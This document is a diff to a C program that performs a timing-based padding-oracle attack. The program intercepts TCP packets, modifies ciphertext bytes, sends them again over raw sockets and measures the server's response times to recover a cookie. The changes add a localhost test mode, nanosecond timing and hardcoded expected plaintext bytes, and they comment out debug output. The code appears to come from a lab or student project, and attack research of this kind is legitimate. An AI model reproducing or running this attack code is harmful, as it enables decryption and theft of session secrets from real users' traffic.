@@ -140,6 +140,10 @@ int main(int argc, char *argv[]) {
       }
       printf("Internet network configuration selected \n");
       break;
+    case 'm':
+      strncpy(ip_client, "127.0.0.1", INET_ADDRSTRLEN);
+      strncpy(ip_server, "127.0.0.1", INET_ADDRSTRLEN);
+      break;
     default:
       fprintf(stderr, "Invalid netowkr configuration flag! \n");
   }
@@ -384,7 +388,7 @@ static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfms
 static inline struct iphdr *extract_ip_header(Byte *payload, unsigned int payload_len){
   struct iphdr *ip_header;
   if(payload_len < sizeof(struct iphdr)){
-    fprintf(stderr, "Payload too small to contain an IP header! \n");
+    //fprintf(stderr, "Payload too small to contain an IP header! \n");
     return NULL;
   }
   ip_header = ((struct iphdr *)payload);
@@ -396,7 +400,7 @@ static inline struct iphdr *extract_ip_header(Byte *payload, unsigned int payloa
 static inline struct tcphdr *extract_tcp_header(Byte *payload, unsigned int payload_len, unsigned int iphdr_len){
   struct tcphdr *tcp_header;
   if(payload_len < (iphdr_len + sizeof(struct tcphdr))){
-    fprintf(stderr, "Payload too small to contain a TCP header! \n");
+    //fprintf(stderr, "Payload too small to contain a TCP header! \n");
     return NULL;
   }
   tcp_header = ((struct tcphdr *)(payload + iphdr_len));
@@ -408,7 +412,7 @@ static inline struct tcphdr *extract_tcp_header(Byte *payload, unsigned int payl
 static inline Byte *extract_application_data(Byte *payload, unsigned int payload_len, unsigned int iphdr_size, unsigned int tcphdr_size){
   Byte *application_data;
   if((payload_len <= (iphdr_size + tcphdr_size))){
-    fprintf(stderr, "Payload too small to contain application data! \n");
+    //fprintf(stderr, "Payload too small to contain application data! \n");
     return NULL;
   }
 
@@ -434,7 +438,7 @@ void modify_packet(bool first_modification){
       val_last_byte = (val_last_byte + 1) % 0x100;
     }
   }else{
-    Byte original_c15 = data_packet->data[5 + ((3-1) * 16) + 15];
+    Byte original_c15 = data_packet->data[5 + ((4-1) * 16) + 15];
     Byte known_plain = cookie[cookie_index-1];
     Byte expected_padding = 0x01;
 
@@ -513,7 +517,7 @@ unsigned short recalculate_checksum(){
 }
 
 //function to send the modified packet to the server
-void send_modified_packet(){
+void send_modified_packet(struct timespec *start){
   int smp_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   int hincl = 1;
   int mark = 1;
@@ -547,6 +551,7 @@ void send_modified_packet(){
 
   //printf("ho creato l'indirizzo ora spedisco il pacchetto al server! \n");
 
+  clock_gettime(CLOCK_MONOTONIC_RAW, start);
   sendto(smp_fd, raw_packet, total_packet_length,0, (struct sockaddr *)&server_addr, sizeof(server_addr));
 
   //printf("pacchetto mandato al server! \n");
@@ -573,7 +578,7 @@ void *do_attack_thread(void *arg){
     exit(EXIT_FAILURE);
   }
 
-  printf("server interface: %s", server_interface);
+  //printf("server interface: %s", server_interface);
 
   while(1){
     // In do_attack_thread:
@@ -600,9 +605,9 @@ void *do_attack_thread(void *arg){
 
     clone_packet(data_packet, original_packet);
 
-    printf("- - - - - - -  - - - - - - BLOCCHI - - - -  - - - - -  - - - - - ");
+    //printf("- - - - - - -  - - - - - - BLOCCHI - - - -  - - - - -  - - - - - ");
     //capire come devo modificare il pacchetto e come tenere traccia della posizione del byte da modificare e con quale valore modificarlo
-    print_data_blocks(data_packet->data, data_packet->data_len);
+    //print_data_blocks(data_packet->data, data_packet->data_len);
     
     //se si tratta di prima modifica, provare in coppia i 2 byte
     //se si tratta di modifica successiva alla prima, impostare il valore dell'ultimo byte in modo tale da inettare 0x01 come padding e modificare il penultimo byte
@@ -620,12 +625,10 @@ void *do_attack_thread(void *arg){
     //printf("Checksum: %04x \n", checksum);
    
     flush_pcap_buffer(pcap_handle);
-    
-    clock_gettime(CLOCK_MONOTONIC_RAW, &start);
-    
-    send_modified_packet();
+         
+    send_modified_packet(&start);
 
-    struct timespec stop = get_server_response_time(pcap_handle);;
+    struct timespec stop = get_server_response_time(pcap_handle, start);;
 
     if(stop.tv_sec == 0 && stop.tv_nsec == 0){
       printf("Server didn't reply \n");
@@ -633,11 +636,17 @@ void *do_attack_thread(void *arg){
       continue;
     }
 
+
+    long long resp_nanosec = ((long long)stop.tv_sec * 1000000000LL) + stop.tv_nsec;
+    long long send_nanosec = ((long long)start.tv_sec * 1000000000LL) + start.tv_nsec;
+    long long delta = resp_nanosec - send_nanosec;
+
+    /*
     long resp_microsec = (stop.tv_sec * 1000000) + (stop.tv_nsec / 1000);
     printf("valore di resp_microsec: %lu \n", resp_microsec);
     long send_microsec = (start.tv_sec * 1000000) + (start.tv_nsec / 1000);
-    printf("valore di send_microsec: %lu \n", send_microsec);
-    long delta = resp_microsec - send_microsec; 
+    printf("valore di send_microsec: %lu \n", send_microsec); 
+    long delta = resp_microsec - send_microsec;   */
 
     printf("Reply delta time: %lu \n", delta);
 
@@ -673,25 +682,32 @@ void *do_attack_thread(void *arg){
         Byte original_ciph_penultimate = original_packet_data[block_offset + 14]; 
         Byte original_ciph_last = original_packet_data[block_offset + 15];
         
-        Byte plain_penultimate = expected_padding ^ guessed_penultimate ^ original_ciph_penultimate;
-        Byte plain_last = expected_padding ^ guessed_last ^ original_ciph_last;
+
+        printf("Valore del penultimo byte: 0x%02x", guessed_penultimate);
+        printf("Valore dell'ultimo byte: 0x%02x", guessed_last);
+        //Byte plain_penultimate = expected_padding ^ guessed_penultimate ^ original_ciph_penultimate;
+        //Byte plain_last = expected_padding ^ guessed_last ^ original_ciph_last;
         
-        printf("Plaintext Penultimo: 0x%02x (ASCII: %c)\n", plain_penultimate, plain_penultimate);
-        printf("Plaintext Ultimo:    0x%02x (ASCII: %c)\n", plain_last, plain_last);
+        //printf("Plaintext Penultimo: 0x%02x (ASCII: %c)\n", plain_penultimate, plain_penultimate);
+        //printf("Plaintext Ultimo:    0x%02x (ASCII: %c)\n", plain_last, plain_last);
 
         /*DEBUGGING
           so che gli ultimi 2 byte del plaintext sono 0x38 (8) e 0x39 (9)
           per ottenere 0x01 0x01 so che i byte che devo iniettare sono
         */
 
+        /*
         Byte expected_last_byte = 0x01 ^ 0x39 ^ original_ciph_last;
-        Byte expcted_penultime_byte = 0x01 ^ 0x038 ^ original_ciph_penultimate;
+        Byte expcted_penultime_byte = 0x01 ^ 0x038 ^ original_ciph_penultimate; */
 
-        printf("I byte che l'analisi statistica deve scegliere sono: \n last_byte: %c \n penultimate_byte: %c", expected_last_byte, expcted_penultime_byte);
+        Byte expected_last_byte = 0x39;
+        Byte expected_penultimate_byte = 0x38;
+
+        printf("I byte che l'analisi statistica deve scegliere sono: \n last_byte: 0x%02x \n penultimate_byte: 0x%02x \n ", expected_last_byte, expected_penultimate_byte);
         
         //stampare i valori delle mediane delle statistica
-        cookie[cookie_index] = plain_last;
-        cookie[cookie_index +1] = plain_penultimate;
+        cookie[cookie_index] = guessed_last;
+        cookie[cookie_index +1] = guessed_penultimate;
         cookie_index+=2;
       }
     }else if(first_attack == false){
